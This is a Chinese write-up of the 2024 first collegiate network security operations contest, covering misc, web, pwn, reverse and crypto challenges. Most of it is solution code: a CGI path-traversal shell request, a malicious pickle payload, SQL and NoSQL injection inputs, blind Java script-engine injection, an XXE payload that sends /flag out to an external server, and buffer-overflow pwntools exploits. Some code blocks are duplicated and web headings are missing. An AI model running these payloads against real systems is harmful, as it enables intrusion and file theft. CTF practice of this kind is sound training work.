# 2024年首届高校网络安全管理运维赛Writeup

> 原文: https://www.ctfiot.com/179730.html
> ID: 179730

Misc

签到

得到gif图片，分离gif，得到synt{fvtava-dhvm-jryy-qbar}

再根据图片提示，rot13⼀下得到flag

钓鱼邮箱识别

Flag1

base64解密发件人得到flag

Flag2

Base64解密邮箱内容得到flag

Flag3

通过VirusTotal查发件人域名foobar-edu-cn.com，发现提示

根据上面的提示想到邮箱的SPF、DKIM 和 DMARC身份认证协议

SPF

DKIM、DMARC(https://dnsspy.io/scan/foobar-edu-cn.com)

easyshell

过滤http流，发现冰蝎流量，使⽤冰蝎默认密钥 e45e329feb5d925b ，在倒数第二个解密，发现在读取secret.txt ⽂件，继续解密流量找到压缩包

发现crc值相同使用明文攻击，得到密码A8s123/+*

解压后得到flag

SecretDB

根据sqlite文件格式解析，提取索引和值

def passwd_decode(code) -> str:
 passwd_list = map(int, code.split('&'))
 result=[]
 for i in passwd_list:
  if 97 <= i <= 100 or 65 <= i <= 68:
   i += 22
  elif i > 57:
   i -= 4
  result.append(chr(i))
  #print(i, chr(i))
 return (''.join(result))
print(passwd_decode("106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56
&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129"))
 # flag{ad1985868133e8cf1828cb84adbe5a5b}

POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: close

echo;cat /fl*;

# urlencode

/nc

post body: port=80&data=[urlencode_data]

from base64 import b64encode
from urllib.parse import quote

def base64_encode(s: str, encoding='utf-8') -> str:
    return b64encode(s.encode()).decode(encoding=encoding)

exc = "raise Exception(__import__('os').popen('cat /fl*').read())"
exc = base64_encode(exc).encode()

opcode = b'''cconfig
notadmin
(S'admin'
S'yes'
u0(cconfig
backdoor
(S'exec(__import__("base64").b64decode(b"%s"))'
lo.''' % (exc)

print(quote(b64encode(opcode).decode())


```
def passwd_decode(code) -> str:
 passwd_list = map(int, code.split('&'))
 result=[]
 for i in passwd_list:
  if 97 <= i <= 100 or 65 <= i <= 68:
   i += 22
  elif i > 57:
   i -= 4
  result.append(chr(i))
  #print(i, chr(i))
 return (''.join(result))
print(passwd_decode("106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56
&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129"))
 # flag{ad1985868133e8cf1828cb84adbe5a5b}
```



```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: close

echo;cat /fl*;

# urlencode

/nc

post body: port=80&data=[urlencode_data]
```



```
admin
1'||'
```



```
from base64 import b64encode
from urllib.parse import quote

def base64_encode(s: str, encoding='utf-8') -> str:
    return b64encode(s.encode()).decode(encoding=encoding)

exc = "raise Exception(__import__('os').popen('cat /fl*').read())"
exc = base64_encode(exc).encode()

opcode = b'''cconfig
notadmin
(S'admin'
S'yes'
u0(cconfig
backdoor
(S'exec(__import__("base64").b64decode(b"%s"))'
lo.''' % (exc)

print(quote(b64encode(opcode).decode())
```



```
{
"username":{
"$toString":"admin"
}
}
```



```
new javax.script.ScriptEngineManager().getEngineByName("JS").eval('a=(new ja'+'va.lang.String(jav'+'a.nio.file.Files.readAllBytes(ja'+'va.nio.file.Paths.get("/flag"))).contains("[Alphabet]"))?x:0')
```



```
import requests
url = ""
def istext(text):
 data = {"expr": '''new javax.script.ScriptEngineManager().getEngineByName("JS").eval('a=(new ja'+'va.lang.String(jav'+'a.nio.file.Files.readAllBytes(ja'+'va.nio.file.Paths.get("/flag"))).contains("''' + text + '''"))?x:0')'''}
 return len(requests.post(url,data).text) == 105
flag = "flag{"
for i in range(100):
 for j in "_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}":
  if istext(flag + j):
   flag += j
   print(flag)
   break
  if j == "~":
   exit(1)
```



```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://[IP]/tmp.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>

# File stored on http://[IP]/tmp.dtd

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://[IP]/tmp.xml?
file=%data;'>">
```



```
from z3 import *

# 求解a1
a1 = 0xADB1D018 + 0x36145344
print(hex(a1))
a1 = 0xe3c6235c

# 求解a2
a2 = BitVec('a2', 32)
s = Solver()
s.add((a2 | 0x8E03BEC3) - 3 * (a2 & 0x71FC413C) + a2 == -1876131848)

if s.check() == sat:
    m = s.model()
    solution = m[a2].as_long()
    print(hex(solution))
a2 = 0x05d9434d

# 求解a3
a3 = BitVec('a3', 32)
s = Solver()
s.add(a3 < 0x10000000)
s.add(4*((~a3&0xA8453437)+2*~(~a3|0xA8453437))+-3*(~a3|0xA8453437)+3*~(a3|0xA8453437)-(-10*(a3&0xA8453437)+(a3^0xA8453437))==551387557)
if s.check() == sat:
    m = s.model()
    solution = m[a3].as_long()
    print(hex(solution))
a2 = 0x04b1edf3

# 求解a4
a4 = BitVec('a4', 32)
s = Solver()
s.add(a4<0x10000000)
# s.add(a4 < 0x84034083)  # 0xf4034083 0xc4034083 0x84034083
s.add(11*~(a4^0xE33B67BD)+4*~(~a4|0xE33B67BD)-(6*(a4&0xE33B67BD)+12*~(a4|0xE33B67BD))+3*(a4&0xD2C7FC0C)+(-5)*a4-(2*~(a4|0xD2C7FC0C))+(~(a4|0x2D3803F3))+(4*(a4&0x2D3803F3))-((-2)*(a4|0x2D3803F3))==(-837785892))
if s.check() == sat:
    m = s.model()
    solution = m[a4].as_long()
    print(hex(solution))
a4 = 0x04034083

#flag{e3c6235c-05d9434d-04b1edf3-04034083}
```



```
from pwn import*
context(arch='amd64', os='linux',log_level="debug")

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("host",port)
    # elf = ELF(name)

get_p("./pwn")
backdoor = 0x040117A
payload = b"A"*0x38 + p64(backdoor)

p.sendlineafter("token","[token]")
p.sendafter("Enter",b"hacker")
p.sendafter("Enter",payload)
# gdb.attach(p,"")
p.interactive()
```



```
p.recvuntil("ed")
p.recv(1)
for i in range(0x10):
 data = p.recv(0x1000)
 if data == 0:
  break
 else:
  with open('output', 'a', encoding='latin-1') as file:
   file.write(data.decode('latin-1'))
```



```
from pwn import *
p = remote('prob03.contest.pku.edu.cn:10004')
p.sendlineafter("Please input your token: ","[token]")
p.sendlineafter("Username: ","adminn")
debug(p,0x401431)
payload=b"adminn"
payload+=b'1q2w3e4r'
payload=payload.ljust(0x9e,b'b')
payload+=p64(0x40127E)
p.sendlineafter("Password: ",payload)
p.interactive()
```



```
from random import shuffle
from tqdm import tqdm
from Crypto.Util.number import *
def instance(m, n):
    start = list(range(m))
    shuffle(start)
    for i in range(m):
        now = start[i]
        this_turn = False
        for j in range(n-1):
            if now == i:
                this_turn = True
                break
            now = start[now]
        if not this_turn:
            #
            return 0
    return 1
def leak(m, n, times=2000):
    message = [instance(m, n) for _ in range(times)]
    return message

with open(r"data.txt",'r')as f:
    f=f.read()
f=eval(f)
print(len(f))
result_=[]

for a, b,result in tqdm(f):
    # print(tmp_m0,tmp_n0,tmp_m1,tmp_n1)
    count1=leak(a[0],a[1])
    count2=leak(b[0],b[1])
    a_,b_,c_=sum(count1),sum(count2),sum(result)
    if abs(c_-b_)>abs(c_-a_):#满足条件和a_更接近,说明是bit为0

        result_.append("0")
    else:
        result_.append("1")#反之和b_更接近，也就是1

print(result_)
print(long_to_bytes(int("".join(result_),2)))
#flag{this_1s_the_sEcret_f1ag}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1715161226.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1715161226.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1715161227.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1715161228.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1715161228.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1715161229.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1715161229.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1715161230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1715161232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1715161235.png)